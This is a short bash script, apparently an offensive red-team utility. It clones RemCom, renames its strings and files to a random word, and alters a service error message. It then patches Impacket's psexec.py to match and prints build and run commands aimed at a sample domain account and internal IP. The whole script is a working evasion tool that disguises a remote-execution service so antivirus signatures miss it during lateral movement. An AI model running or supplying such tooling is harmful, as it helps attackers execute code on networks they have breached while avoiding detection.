#!/usr/bin/env bash

SEARCH="RemCom"
REPLACE=`cat /dev/urandom | tr -dc '[:alpha:]' | fold -w 8 | head -n 1`

git clone -q https://github.com/kavika13/RemCom RemComObf

find RemComObf -type f -exec sed -i -e "s/${SEARCH}/${REPLACE}/g" {} \;
sed -i "s/A service Cannot be started directly./Nothing's here.../g" RemComObf/RemComSvc/Service.cpp

mv RemComObf/${SEARCH}.cpp RemComObf/${REPLACE}.cpp
mv RemComObf/${SEARCH}.h RemComObf/${REPLACE}.h
mv RemComObf/${SEARCH}.rc RemComObf/${REPLACE}.rc
mv RemComObf/${SEARCH}.vcxproj RemComObf/${REPLACE}.vcxproj

mv RemComObf/RemComSvc/${SEARCH}Svc.cpp RemComObf/RemComSvc/${REPLACE}Svc.cpp
mv RemComObf/RemComSvc/${SEARCH}Svc.h RemComObf/RemComSvc/${REPLACE}Svc.h
mv RemComObf/RemComSvc/${SEARCH}Svc.vcxproj RemComObf/RemComSvc/${REPLACE}Svc.vcxproj

mv RemComObf/${SEARCH}Svc RemComObf/${REPLACE}Svc

echo "[*] Compile: MSBuild.exe 'Remote Command Executor.sln' /t:${REPLACE}:Rebuild /p:Configuration=Release /p:PlatformToolset=v143"

git clone -q https://github.com/fortra/impacket

sed -i "s/${SEARCH}_/${REPLACE}_/g" impacket/examples/psexec.py

echo "[*] Run: python3 impacket/examples/psexec.py megacorp.local/snovvcrash@192.168.1.11 -file RemComObf/${SEARCH}Svc/Release/${REPLACE}Svc.exe"